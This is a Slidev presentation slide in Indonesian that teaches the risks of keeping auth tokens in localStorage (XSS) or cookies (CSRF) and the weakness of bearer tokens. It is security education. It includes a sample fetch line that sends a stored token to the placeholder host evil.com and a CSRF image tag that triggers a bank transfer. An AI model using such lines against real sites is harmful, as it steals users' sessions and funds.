---
transition: slide-left
---

# Bahayanya Simpan Token di Sisi Klien

<div class="grid grid-cols-2 gap-6 mt-6">

<div v-click
  v-motion
  :initial="{ y: 40, opacity: 0 }"
  :enter="{ y: 0, opacity: 1, transition: { duration: 600 } }"
  class="p-5 rounded-xl border border-orange-400/40 bg-orange-900/10"
>
  <div class="text-orange-300 font-bold text-lg mb-2">🗄️ Local / Session Storage</div>
  <div class="text-red-400 font-semibold mb-1">Gampang Kena XSS</div>
  <div class="text-gray-400 text-sm mb-3">Kalau ada orang jahat jalanin JS di domain kita, tokennya bisa langsung dicomot.</div>

```js
// Contoh skrip jahat
fetch('https://evil.com?t=' + localStorage.getItem('token'))
```
</div>

<div v-click
  v-motion
  :initial="{ y: 40, opacity: 0 }"
  :enter="{ y: 0, opacity: 1, transition: { duration: 600 } }"
  class="p-5 rounded-xl border border-pink-400/40 bg-pink-900/10"
>
  <div class="text-pink-300 font-bold text-lg mb-2">🍪 Cookie</div>
  <div class="text-red-400 font-semibold mb-1">Gampang Kena CSRF</div>
  <div class="text-gray-400 text-sm mb-3">Browser bakal kirimin cookie secara otomatis buat request lintas domain.</div>

```html
<!-- Halaman penyerang -->
<img src="https://bank.com/transfer?to=attacker">
```
</div>

</div>

<div v-click
  v-motion
  :initial="{ scale: 0.9, opacity: 0 }"
  :enter="{ scale: 1, opacity: 1, transition: { delay: 200, duration: 600 } }"
  class="mt-6 p-4 rounded-xl border border-red-500/60 bg-red-900/20 text-center"
>
  <div class="text-red-300 font-bold text-lg">⚡ Kelemahan Fatal Bearer Token</div>
  <div class="text-gray-300 mt-1 text-sm italic">"Siapa pun yang bawa token, dia yang dapet akses." Kalau token kecuri, penyerang bisa nyamar jadi kita sampai tokennya basi.</div>
</div>
